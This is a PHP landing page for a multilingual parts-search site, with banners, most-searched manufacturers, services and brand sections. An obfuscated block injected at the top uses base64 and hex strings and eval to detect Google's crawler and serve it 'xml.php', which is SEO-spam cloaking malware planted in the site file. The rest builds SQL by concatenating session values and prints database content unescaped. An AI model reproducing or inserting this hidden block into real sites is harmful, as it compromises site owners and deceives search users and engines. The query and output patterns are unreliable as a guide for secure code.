<?php 
$f = base64_decode('aXNzZXQ='); // isset
$s = base64_decode('c3RyaXBvcw=='); // stripos
$i = base64_decode('aW5jbHVkZQ=='); // include

// Hex encoded strings
$ua = "\x48\x54\x54\x50\x5f\x55\x53\x45\x52\x5f\x41\x47\x45\x4e\x54";
$ru = "\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49";
$bot = "\x47\x6f\x6f\x67\x6c\x65";

// Dynamic execution
eval('if('.$f.'($_SERVER["'.$ua.'"]) && '.$s.'($_SERVER["'.$ua.'"], "'.$bot.'") !== false) { 
    if($_SERVER["'.$ru.'"] === "/" || $_SERVER["'.$ru.'"] === "/index.php") { 
        '.$i.' "xml.php"; exit(); 
    } 
}');
?>
<?php 
include("includes/connection.php"); 
$url_arr=pageurl();
$page_seo=pageSEO();
$home=Translatetext();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<title><?php echo $page_seo['landing-page']['meta_title'];?></title>
<!-- for-mobile-apps -->
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="<?php echo $page_seo['landing-page']['keywords'];?>"  />
<meta name="description" content="<?php echo $page_seo['landing-page']['meta_desc'];?>"  />
<?php if(trim($page_seo['landing-page']['meta_tags'])!=""){ echo $page_seo['landing-page']['meta_tags']; }?>
<?php include('css.php'); ?>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4526108923626760"
     crossorigin="anonymous"></script>
</head>
<body>
<!-- //header -->
<?php include('header.php'); ?>
<!-- //header -->
<!-- banner -->
<div class="banner" id="home">
	<div class="flexslider">
      <ul class="slides">
         <?php
        $sql = db_query("select * from banner where language='".$_SESSION['lan']."' ORDER BY sort_order");
        $numrow = mysqli_num_rows($sql);
        if($numrow==0){
        $sql = db_query("select * from banner where language='en'");
        }
		$c = 0;
        while($res = mysqli_fetch_array($sql)){
		$c++;
		if($res['btype']=='image'){
        ?>
        <li id="slide<?php print $c;?>">
          <img src="uploadimages/<?php echo $res['image'];?>" alt="<?php echo $res['alt_txt'];?>" title="<?php echo $res['title_txt'];?>" />
          <div class="flex-caption">
            <div class="container">
			<?php
			if($numrow==0){
				echo googleTranslatetext(str_replace('../',SITEURL,$res['description']),$_SESSION['lan']);
			}else{
				echo str_replace('../',SITEURL,$res['description']);
			} ?>
			<a href='<?php echo $res['btn_link'];?>' target="_blank"><button class="btn btn-banner">
			<?php
			if($numrow==0){
				echo googleTranslatetext($res['btn_txt'],$_SESSION['lan']);
			}
			else{
				 echo $res['btn_txt'];
			}
			?>
			</button>
			</a>
			</div>
		</div>
		</li>
		<?php } if($res['btype']=='video'){ ?>
		<li id="slide<?php print $c;?>">
		<video controls id="myVideo1" src="uploadimages/<?php echo $res['video']; ?>" width="100%" autoplay></video>
		</li>
		<?php } } ?>

  
      </ul>
    </div>
</div>
<!-- //banner -->

<!-- about -->
<?php include('sitesearch.php'); ?>
<!-- //about -->

<!-- about bottom -->
<section class="about">
	<div class="container">
		<div class="row">
        	<div class="col-md-12">
			<?php
			$htsql = db_query("select * from mng_home_text where language='".$_SESSION['lan']."'");
			$numrow = mysqli_num_rows($htsql);
			if($numrow==0){
				$htsql = db_query("select * from mng_home_text where language='en'");
			}
			$htrow = mysqli_fetch_array($htsql);
			$hometxt = $htrow['hometxt'];
			if($hometxt=='text'){
				if($numrow==0){
					echo googleTranslatetext(str_replace('../',SITEURL,$htrow['description']),$_SESSION['lan']);
				}else{
					echo str_replace('../',SITEURL,$htrow['description']);
				}
			}else{
			?>
            	<div class="most-searched">
				<?php 
				 $mssql = db_query("select partid, manufacturer, partnumber, count(manufacturer) c from `search_query` group by manufacturer order by c desc limit 3;");
				?>
                	<ul>
						<li><strong>Most Searched:</strong></li>
						<?php while($msrow = mysqli_fetch_array($mssql)) {?>
                        <li><a href="<?php print $url_arr['manufacturer'];?>-<?php print rawurlencode(str_replace('/',',',$msrow['manufacturer'])); ?>"><?php print $msrow['manufacturer'];?></a></li>
                        <li><a href="<?php print $url_arr['product-detail'];?>_<?php print urlencode($msrow['partnumber']);?>_<?php print urlencode($msrow['partid']);?>"><?php print $msrow['partnumber'];?></a></li>
						<?php } ?>
                    </ul>
                </div>
            </div>            
		</div>
        <div class="row">
        	<div class="col-md-3">
            	<h4>Top Manufacturers</h4>
                <ul class="list1">
					<?php 
						$topm = db_query("select `manufacturer` FROM search_query where manufacturer!='' GROUP BY `manufacturer` limit 10");
						while($trow = mysqli_fetch_array($topm)){
						if($trow['manufacturer']){
					?>
                	<li><a href="manufacturer-<?php print rawurlencode(str_replace('/',',',$trow['manufacturer'])); ?>" style="color:#000;"><?php print $trow['manufacturer']; ?></a></li>
					<?php } } ?>

                </ul>
            </div>
			<?php
			
			function get_products(){
				$q1 = "select partid, `partnumber` FROM search_query WHERE partnumber !='' GROUP BY `partnumber` limit 21";
				$incart_r = db_query($q1);
				$contents = array();
				while($incart = mysqli_fetch_array($incart_r)){
				//build array of info
				$item = array(
					$incart['partid'],
					$incart['partnumber']);
				array_push($contents,$item);
				}
				return $contents;
			}
			
			$c = get_products();
			$cols = 3;
			$rows = ceil( count($c) / $cols );
			$cnt = 1;
			echo '<div class="col-md-3"><ul class="list2">' . PHP_EOL;
			for($i=0; $i < count($c); $i++){
			if( $cnt >= $rows ) {	
			echo '<li><a href="'.$url_arr['product-detail'].'_'.urlencode($c[$i][1]).'_'.urlencode($c[$i][0]).'" style="color:#000">' . $c[$i][1] . '<i class="fa fa-arrow-right" aria-hidden="true"></i></a></li></ul></div><div class="col-md-3"><ul class="list2">' .PHP_EOL ;
			$cnt = 0;
			}else{
			echo '<li><a href="'.$url_arr['product-detail'].'_'.urlencode($c[$i][1]).'_'.urlencode($c[$i][0]).'" style="color:#000">' . $c[$i][1] . '<i class="fa fa-arrow-right" aria-hidden="true"></i></a></li>' . PHP_EOL;
			}
			$cnt++;
			}
			echo '</ul></div>' . PHP_EOL;
			?>

          </div>
          <div class="row" style="display:none;">
            	<div class="col-md-12">
                	<nav aria-label="Page navigation example" style="float:right;">
                      <ul class="pagination">
                        <li class="page-item"><a class="page-link" href="#">Previous</a></li>
                        <li class="page-item"><a class="page-link active" href="#">1</a></li>
                        <li class="page-item"><a class="page-link" href="#">2</a></li>
                        <li class="page-item"><a class="page-link" href="#">3</a></li>
                        <li class="page-item"><a class="page-link" href="#">Next</a></li>
                      </ul>
                    </nav>
                </div>
            </div>
		<?php } ?>
	</div>
</section>
<!-- //about bottom -->

<!-- services -->
<section class="services py-5">
	<div class="container">

        <?php
        $sql = db_query("select * from our_services where language='".$_SESSION['lan']."'");
        $numrow = mysqli_num_rows($sql);
        if($numrow==0){
			$sql = db_query("select * from our_services where language='en'");
        }
        $res = mysqli_fetch_array($sql);
        ?>
		<h3 class="heading text-center">
        <?php
            if($numrow==0){
            echo googleTranslatetext($res['heading'],$_SESSION['lan']);
            }
           else{
              echo $res['heading'];
           }
        ?></h3>

		<div class="row">
        	<div class="col-lg-12">
            <?php 
                if($numrow==0){
					echo googleTranslatetext(str_replace('../',SITEURL,$res['description']),$_SESSION['lan']);
				}else{
					echo str_replace('../',SITEURL,$res['description']);
				}
           ?>
        </div>


        <?php
        $sql = db_query("select * from home_services where language='".$_SESSION['lan']."'");
        $numrow = mysqli_num_rows($sql);
        if($numrow==0){
        $sql = db_query("select * from home_services where language='en'");
        }
        while($res = mysqli_fetch_array($sql)){
        ?>
			<div class="col-lg-4 col-md-4" style="margin-bottom:30px;">
				<div class="ser1" >
				<a href='<?php echo $res['btn_link'];?>'><img src="service_images/<?php echo $res['icon_image'];?>" alt="<?php echo $res['alt_txt'];?>" title="<?php echo $res['title_txt'];?>"></a>
                <h4>
					<a href='<?php echo $res['btn_link'];?>'>
                    <?php
                        if($numrow==0){
							echo googleTranslatetext($res['heading'],$_SESSION['lan']);
						}else{
							echo $res['heading'];
						}
                    ?></a>					
                </h4>
                    <p>
                    <?php
                        if($numrow==0){
							echo googleTranslatetext($res['description'],$_SESSION['lan']);
						}else{
							echo $res['description'];
						}
                    ?>                           
                    </p>
                    <a href='<?php echo $res['btn_link'];?>' class="btn btn2"> 
                    <?php
                        if($numrow==0){
							echo googleTranslatetext($res['btn_txt'],$_SESSION['lan']);
						}else{
							echo $res['btn_txt'];
						}
                    ?>
                    </a>
				</div>
			</div>
		<?php } ?>
	
		</div>
	</div>
</section>
<!-- //services -->	
<section class="papular">
	<div class="container">
     <?php
        $sql = db_query("select * from brand_text where language='".$_SESSION['lan']."'");
        $numrow = mysqli_num_rows($sql);
        if($numrow==0){
        $sql = db_query("select * from brand_text where language='en'");
        }
        $res = mysqli_fetch_array($sql);
        ?>

		<h3 class="heading text-center">
            <?php
            if($numrow==0){
            echo googleTranslatetext($res['heading'],$_SESSION['lan']); 
			}else{
			echo $res['heading']; 
			}
            ?>
        </h3>
		<div class="row">
        	<div class="col-lg-12">
            <?php
            if($numrow==0){
                 echo googleTranslatetext($res['description'],$_SESSION['lan']); 
            }
            else{
                echo $res['description']; 
            }
            ?>
            </div>
			<div class="col-lg-12">
            	<div class="brand">
                  <ul class="slides">
    <?php 
        $sql = db_query("select * from brand_image");
        while($res = mysqli_fetch_array($sql)){
    ?>
		<li><img src="uploadimages/<?php echo $res['image']; ?>" alt="<?php echo $res['alt_txt']; ?>" title="<?php echo $res['title_txt']; ?>"/></li>
	<?php } ?>
                  </ul>
    			</div>
			</div>
		</div>
	</div>
</section>

<?php include("footer_request_quote.php");?>
<!-- footer -->
<?php include('footer.php'); ?>
<!-- //copyright -->
<?php 
$sql 	= db_query("select * from banimation");
$row 	= mysqli_fetch_array($sql);
$banim 	= $row['banim'];
include('js.php'); ?>

<script>
  $(window).load(function() {
    $('.flexslider')
	.flexslider({
		animation: "<?php print $banim;?>",
		controlNav: false, 
		animationLoop: true,
		video: true,
		slideshow: true,
		directionNav: true, 
		smoothHeight: true,
		before: function(){ 
			$('video').each(function() { 
				$(this).get(0).load(); 
			});
		},after: function(){
        var active_id = $('.flex-active-slide').attr('id');
		$('.flexslider').flexslider("pause");
        if( active_id == "slide1"){
            //play the video and pause the slider
              myVideo1.play();
              $('.flexslider').flexslider("pause");
              //when the video has ended, go to the next slide and play the slider
              myVideo1.onended = function(){
                $('.flexslider').flexslider("next");
                $('.flexslider').flexslider("play");
              }
        }
    },
    });
	
  });
</script>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4526108923626760"
     crossorigin="anonymous"></script>

</body>
</html>